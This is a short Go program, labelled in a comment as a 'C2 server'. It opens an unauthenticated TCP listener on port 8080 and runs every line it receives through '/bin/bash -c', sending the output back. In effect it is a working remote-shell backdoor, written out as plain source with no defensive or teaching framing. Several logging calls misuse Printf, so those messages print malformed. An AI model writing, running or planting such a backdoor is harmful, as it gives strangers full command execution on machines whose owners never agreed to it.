package main

import (
	"fmt"
	"net"
	"os/exec"
	"bufio"
)

func main() {
	// Listener TCP
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Error creating listener: ", err)
		return
	}
	defer ln.Close()

	fmt.Println("C2 server started on port", ln.Addr().String())

	// Waiting for conections
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection: ", err)
			continue
		}

		// Handling the connection in a separate goroutine
		fmt.Printf("New connection from ", conn.RemoteAddr().String())
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Read the received command
	reader := bufio.NewReader(conn)
	for {
        command, err := reader.ReadString('\n')
        if err != nil {
            fmt.Println("Error reading command or connection closed: ", err)
            return
        }
        command = command[:len(command)-1] // Remove the '\n'
        fmt.Printf("Received command: ", command)

        out, err := exec.Command("/bin/bash", "-c", command).Output()
        if err != nil {
            fmt.Println("Error executing command: ", err)
            response := []byte("Error executing command\n")
            conn.Write(response)
            continue
        }

        response := append(out, '\n')
        _, err = conn.Write(response)
        if err != nil {
            fmt.Println("Error writing response: ", err)
            return
        }
        fmt.Printf("Response sent: ", string(out))
    }
}